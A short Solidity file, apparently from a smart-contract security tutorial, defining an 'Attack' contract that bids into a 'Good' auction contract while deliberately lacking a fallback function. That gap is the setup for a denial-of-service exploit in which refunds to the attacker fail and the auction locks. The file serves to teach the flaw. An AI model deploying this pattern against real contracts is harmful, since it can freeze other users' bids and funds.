// SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

import "./Good.sol";

contract Attack {
    Good good;

    constructor(address _good) {
        good = Good(_good);
    }

    function attack() public payable {
        // Note: This function doesn't have a fallback function LATER Explained
        good.setCurrentAuctionPrice{value: msg.value}();
    }
}
